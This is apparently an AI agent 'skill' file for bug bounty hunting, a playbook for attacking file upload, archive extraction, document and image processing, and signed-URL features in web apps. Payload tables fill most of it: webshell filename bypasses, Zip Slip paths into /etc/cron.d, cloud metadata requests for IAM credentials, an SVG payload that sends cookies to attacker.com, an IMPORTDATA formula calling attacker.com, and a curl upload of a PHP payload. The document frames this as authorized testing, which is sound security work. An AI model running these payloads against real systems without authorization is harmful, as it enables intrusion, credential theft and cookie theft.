---
name: file-processing
description: File upload, import, and processing chain exploitation — from upload validation bypass to server-side parser abuse, archive extraction, preview/thumbnail generation, and signed download URL manipulation. The most universally applicable attack surface on modern web apps. Use when a target accepts file uploads (profile images, document imports, CSV/XLSX uploads, archive extraction, PDF generation, video/image processing), exposes import-from-URL features, generates thumbnails or previews, or offers file export/download. Trigger on "file upload", "upload bypass", "import from URL", "file processing", "image upload", "CSV import", "document upload", "archive upload", "ZIP upload", "thumbnail generation", "file preview", "SVG upload", "presigned URL", "signed download", "file export", "polyglot file", "MIME type", "content type bypass", "extension bypass", "magic bytes", "file validation", "upload RCE", "webshell upload", "import feature", "bulk import", "file conversion", "image resize", "PDF generation", "wkhtmltopdf", "video upload", "ffmpeg", "imagemagick". For filename canonicalization and Unicode tricks, see parser-differentials in vuln-patterns. For SSRF via import-from-URL, also cross-reference vuln-patterns SSRF section.
---

# File Processing Chain Exploitation

Every modern web app processes files — profile images, document imports, CSV uploads, archive extraction, PDF generation, video transcoding. Each stage in the processing chain is a distinct attack surface with its own bug classes. This skill covers the full chain from upload to delivery.

## Why This Pays

- **Universal surface**: Almost every target accepts files somewhere
- **High severity**: Upload-to-RCE chains are consistently Critical ($5K-$50K+)
- **Under-tested**: Automated scanners test extension bypass; they miss parser abuse, async processing, and storage-layer bugs
- **Chains well**: File processing bugs chain with SSRF, XSS, and auth bypass for severity escalation

### Key CVEs

| CVE | Product | Type | Impact |
|-----|---------|------|--------|
| CVE-2026-28289 | FreeScout | U+200B filename bypass → webshell | CVSS 10.0 — zero-click via email attachment |
| CVE-2025-43714 | ChatGPT | SVG active content → XSS | HTML/JS execution in AI preview window |
| CVE-2026-24085 | Windows | NTFS path traversal via archive extraction | Arbitrary file overwrite, privilege escalation |
| CVE-2025-67511 | CAI | Command injection via filename | CVSS 9.6 — AI security tool itself vulnerable |
| CVE-2026-27825 | mcp-atlassian | Path traversal in file download → RCE | CVSS 9.1 — overwrites ~/.bashrc, ~/.ssh/authorized_keys |
| CVE-2025-55182 | React RSC | Deserialization via file-like Flight payload | CVSS 10.0 — pre-auth RCE |
| CVE-2026-30957 | OneUptime | Playwright sandbox escape via uploaded script | CVSS 9.9 — OS command execution |

---

## Quick Start — First 5 Minutes

1. **Find upload endpoints** — Profile image, document import, CSV/XLSX upload, any `multipart/form-data` endpoint
2. **Test extension bypass** — Upload `shell.php.jpg`, `shell.php%00.jpg`, `shell.PhP`, `shell.php .` (trailing space)
3. **Test SVG/HTML** — Upload `<svg onload=alert(1)>` as `.svg`. Upload `.html` with JavaScript.
4. **Test import-from-URL** — If any "import from URL" feature exists, send `http://169.254.169.254/latest/meta-data/`
5. **Test archive extraction** — Upload ZIP with `../../etc/passwd` path entry (Zip Slip)

If you have a hit, run `/reportability-check` before `/write-report`. If blocked, run `/variant-hunt`.

---

## The File Processing Chain

Every file goes through a chain of stages. Each stage is a distinct attack surface:

```
Upload → Validation → Storage → Processing → Delivery
  │          │            │          │           │
  │          │            │          │           └─ Signed URL manipulation
  │          │            │          │              Cross-tenant access
  │          │            │          │              Cache poisoning via filename
  │          │            │          │
  │          │            │          └─ Parser abuse (ImageMagick, ffmpeg, Tika)
  │          │            │             Preview/thumbnail generation
  │          │            │             Archive extraction (ZIP, TAR, RAR)
  │          │            │             Document conversion (wkhtmltopdf, LibreOffice)
  │          │            │             AV/CDR scan race (upload before scan completes)
  │          │            │
  │          │            └─ Storage key prediction
  │          │               Object storage ACL misconfiguration
  │          │               Symlink following on filesystem storage
  │          │               Path traversal in storage path construction
  │          │
  │          └─ Extension bypass (double ext, null byte, Unicode, case folding)
  │             MIME type mismatch
  │             Magic bytes check bypass (polyglot files)
  │             Size limit bypass (chunked upload, multipart abuse)
  │             Filename sanitization bypass
  │
  └─ Multipart parsing differentials
     Content-Disposition header injection
     Boundary confusion
     Chunked transfer encoding abuse
```

**Hunt strategy:** Map which stages the target implements, then test each stage boundary. The highest-value bugs are at the **validation → storage** and **storage → processing** boundaries where TOCTOU windows exist.

---

## Stage 1: Upload Validation Bypass

### Extension and MIME Bypass

| # | Test | Payload | What to look for |
|---|------|---------|-----------------|
| 1 | Double extension | `shell.php.jpg` | Apache processes first extension; validation checks last |
| 2 | Null byte (legacy) | `shell.php%00.jpg` | Filesystem truncates at null; validator sees `.jpg` |
| 3 | Case folding | `shell.PhP` | Case-insensitive execution; case-sensitive validation |
| 4 | Trailing char | `shell.php .` or `shell.php.` | Windows strips trailing space/dot |
| 5 | NTFS ADS | `shell.php::$DATA` | Windows alternate data stream bypasses extension check |
| 6 | Content-Type mismatch | Set `image/jpeg` header; send PHP body | Validator checks header not content |
| 7 | Polyglot file | Valid JPEG with embedded PHP in EXIF/comment | Passes image validation; executes as PHP |
| 8 | Unicode zero-width | `shell.ph​p` (U+200B between `l` and `.`) | Validator sees "shell.ph\u200Bp"; storage strips → `shell.php` |

### Size and Chunking Bypass

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Chunked upload | Split file across multiple chunks; total exceeds size limit | Server reassembles beyond max size |
| 2 | Content-Length mismatch | Declare small Content-Length; send larger body | Proxy forwards based on header; backend reads full body |
| 3 | Multipart boundary abuse | Nested boundaries or invalid boundary format | Parser confusion leaks fields across parts |
| 4 | Concurrent upload race | Upload same filename in parallel | Race condition on overwrite/version check |

### Decision: Extension bypass confirmed?

- **Yes, webshell executes** → Critical. Capture request/response. Run `/write-report`.
- **Yes, but no execution** → Check if file is served from a domain that renders HTML/SVG (stored XSS). If on static CDN, check for content sniffing.
- **No** → Move to Stage 2 (storage) or Stage 3 (processing).

---

## Stage 2: Storage Layer Bugs

### Path Traversal in Storage

If the application uses the uploaded filename to construct a storage path:

| # | Test | Payload | What to look for |
|---|------|---------|-----------------|
| 1 | Directory traversal | `../../../etc/cron.d/shell` | File written outside upload directory |
| 2 | Symlink following | Upload symlink pointing to `/etc/shadow` | Server follows symlink on read |
| 3 | Storage key prediction | Sequential IDs or predictable UUIDs (v1 timestamp-based) | Access other users' files by guessing keys |
| 4 | Object ACL misconfiguration | If S3/GCS: try `?acl`, check bucket policy | Public read on private uploads |

### Cross-Tenant File Access

For multi-tenant applications (B2B SaaS, shared hosting):

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Tenant ID swap | Change `tenant_id` or `org_id` in download URL | Access another tenant's files |
| 2 | Shared storage namespace | Upload file as Tenant A; access via Tenant B's path | Files stored in shared namespace without isolation |
| 3 | Presigned URL reuse | Get presigned URL for your file; modify the key/path portion | Access other files with valid signature |

---

## Stage 3: Server-Side Processing

This is where the highest-severity bugs live. Server-side file processing often runs with elevated privileges and processes attacker-controlled content.

### Import-from-URL (SSRF)

Any feature that fetches a file from a user-provided URL is an SSRF vector:

| # | Test | Payload | What to look for |
|---|------|---------|-----------------|
| 1 | Cloud metadata | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | IAM credentials in response or error |
| 2 | Internal service | `http://localhost:8080/admin` or `http://10.0.0.1/` | Internal service responses |
| 3 | DNS rebinding | URL that resolves to public IP first, then `169.254.169.254` on second resolve | Bypass allowlist that checks DNS at request time |
| 4 | File protocol | `file:///etc/passwd` (if supported) | Local file read |
| 5 | Redirect chain | Allowlisted host that 302s to internal IP | Bypass URL validation via redirect |

**SSRF via file content:** Some processors follow URLs embedded in the file itself (SVG `<image href>`, DOCX external references, HTML `<img src>`, XML external entities). Upload a file with an internal URL reference and check for server-side fetch.

### Archive Extraction (Zip Slip and Friends)

| # | Test | Archive content | What to look for |
|---|------|----------------|-----------------|
| 1 | Zip Slip | Entry with path `../../etc/cron.d/backdoor` | File extracted outside target directory |
| 2 | Symlink abuse | ZIP containing symlink pointing to `/etc/shadow` | Server follows symlink after extraction |
| 3 | ZIP bomb | Small archive that decompresses to enormous size | DoS via disk or memory exhaustion |
| 4 | Filename encoding | Entry with non-UTF-8 encoding or null bytes | Parser confusion on filename handling |
| 5 | Nested archives | ZIP within ZIP within ZIP (recursion) | Resource exhaustion or extraction path confusion |

**Real-world pattern:** CVE-2026-24085 (Windows) — NTFS path traversal via archive extraction overwrites arbitrary files. CVE-2026-27825 (mcp-atlassian) — path traversal in Confluence attachment download overwrites `~/.bashrc` for RCE.

### Image Processing (ImageMagick, Pillow, Sharp, libvips)

| # | Test | Payload | What to look for |
|---|------|---------|-----------------|
| 1 | SVG SSRF | `<svg><image href="http://169.254.169.254/"/>` | Server-side fetch during rendering |
| 2 | SVG + XSS | `<svg onload="fetch('https://attacker.com/?c='+document.cookie)">` | JS execution when SVG is served |
| 3 | ImageMagick delegate | Upload crafted MVG/SVG triggering shell command via delegate | RCE (ImageTragick pattern, still recurring) |
| 4 | Memory corruption | Crafted TIFF/PNG with malformed headers | Crash or code execution in image library |
| 5 | EXIF injection | Malicious EXIF data (XSS in metadata display, command injection in processing) | Stored XSS or RCE via EXIF processing |

### Document Processing (wkhtmltopdf, LibreOffice, Tika, Pandoc)

| # | Test | Payload | What to look for |
|---|------|---------|-----------------|
| 1 | wkhtmltopdf SSRF | HTML with `<iframe src="file:///etc/passwd">` or internal URLs | Local file read or SSRF in generated PDF |
| 2 | LibreOffice macro | DOCX with embedded macro | Code execution on conversion server |
| 3 | DOCX XXE | External entity reference in DOCX XML | File read or SSRF via XML parser |
| 4 | XLSX formula injection | `=IMPORTDATA("http://attacker.com/")` in spreadsheet cell | SSRF when file is processed/previewed |
| 5 | PDF JavaScript | Embedded JS in PDF (`/OpenAction`, `/AA`) | Code execution in PDF viewer or server-side renderer |
| 6 | Tika parser abuse | Crafted file triggering parser-specific vulnerability | RCE or DoS in content extraction |

### Video/Audio Processing (ffmpeg, MediaInfo)

| # | Test | Payload | What to look for |
|---|------|---------|-----------------|
| 1 | ffmpeg SSRF | M3U8 playlist pointing to internal host | Server-side request to internal IP |
| 2 | HLS injection | Crafted .m3u8 with `file://` protocol | Local file read via ffmpeg |
| 3 | Subtitle injection | SRT/ASS subtitle with script content | XSS or command injection in subtitle rendering |
| 4 | Metadata SSRF | Video with embedded URL metadata | Fetch during metadata extraction |

---

## Stage 4: Delivery and Access Control

### Signed/Presigned URL Abuse

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Signature algorithm confusion | Change algorithm in signed URL parameters | Server accepts weaker or no algorithm |
| 2 | Expiry manipulation | Modify expiry timestamp to far future | Long-lived access to private files |
| 3 | Path traversal in signed URL | Change the file path while keeping same signature | Signature doesn't cover the full path |
| 4 | Presigned URL enumeration | Predict or enumerate presigned URL patterns | Access other users' private files |

### Download/Export Access Control

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Direct object reference | Access `/download/12345` where 12345 is another user's file ID | File served without ownership check |
| 2 | Unauthenticated export | Request `/api/export` or `/api/backup` without auth | Sensitive data in export without auth |
| 3 | Filename injection in download | Set `filename` param to `../../etc/passwd` in download endpoint | Path traversal in Content-Disposition or file serving |
| 4 | Race: upload → scan → download | Download file immediately after upload, before AV scan completes | Malicious file accessible in scan window |

---

## Proof Requirements

| Bug Class | Minimum Proof |
|-----------|--------------|
| Upload → RCE | Webshell executing OS command (screenshot of `whoami` output) |
| Upload → Stored XSS | SVG/HTML triggering JS in another user's browser session |
| SSRF via import | Cloud metadata or internal service response from server-side fetch |
| Zip Slip | File written outside extraction directory (show file path in response or side effect) |
| Cross-tenant file access | File belonging to Account B accessed from Account A's session |
| Presigned URL abuse | Private file accessed by manipulating signed URL parameters |
| Parser RCE | Command execution output from crafted image/document/video |
| AV scan race | Malicious file downloadable before scan completion (timestamped evidence) |

---

## Validation Gate: Is This Submittable?

Before writing a report:
- [ ] **Reproduced manually** with curl/Burp — not just scanner output
- [ ] **Impact is real** — file actually executes, renders, or reaches internal host (not just a content-type change)
- [ ] **Affects other users** — not just self-XSS via your own uploaded file
- [ ] **Server-side** — client-side file rendering in your own browser is usually not reportable
- [ ] **Not a self-DOS** — ZIP bomb against your own account is low value
- [ ] **In scope** — file processing endpoint is part of the program's scope
- [ ] **Not a known limitation** — check if program explicitly excludes file upload bugs or self-XSS

---

## Common False Positives

| Looks like a bug | But actually... | How to verify |
|-----------------|-----------------|---------------|
| File uploads to S3 with guessable key | Bucket has proper ACL; key is just a name | Try accessing without auth — does S3 return the file? |
| SVG renders with `<script>` tag | Served from a sandboxed domain (CDN, separate origin) | Check the serving domain — same origin as app? |
| DOCX contains macros after upload | Server strips macros on processing | Download the processed file; are macros still present? |
| Import-from-URL accepts internal IP | Server returns generic error, no useful data leaked | Check if actual response content or metadata is returned |
| Extension bypass accepted | File stored but never executed | Access the uploaded file directly — does server process it or serve as static? |

---

## Priority Decision Framework

1. **Import-from-URL → SSRF** — Test first. Highest severity (cloud creds). Quick to test.
2. **Archive extraction → Zip Slip** — If target processes ZIPs/TARs, test immediately. Path traversal in extraction is consistently Critical.
3. **Document/image processing → Parser abuse** — wkhtmltopdf, ImageMagick, ffmpeg are historically rich targets. Check if backend processes uploaded files.
4. **Extension bypass → RCE** — Classic but increasingly rare due to CDN serving. Still worth testing on self-hosted targets.
5. **Cross-tenant file access** — For B2B SaaS targets, always test if Tenant A can access Tenant B's uploads.
6. **Signed URL manipulation** — If target uses presigned URLs, test signature coverage and expiry manipulation.
7. **AV scan race** — Low priority unless target explicitly claims malware scanning.

**Stop signal:** If the target serves all uploads from a static CDN (CloudFront, Cloudflare R2) with no server-side processing, move on to other attack surfaces. CDN-served static files with proper Content-Type headers have minimal attack surface.

---

## Tool Recommendations

- **Burp Suite** — Intercept and modify upload requests; test multipart boundary handling
- **ffuf/wfuzz** — Fuzz filename extensions, Content-Type values, archive entries
- **zippy / evilarc** — Generate malicious ZIP archives with path traversal entries
- **gifoeb** — Create polyglot GIF/PHP files
- **exiftool** — Inject payloads into image EXIF metadata
- **wkhtmltopdf-ssrf.html** — Template for testing wkhtmltopdf SSRF
- **curl** — Direct multipart upload testing: `curl -F "file=@payload.php;type=image/jpeg" target.com/upload`
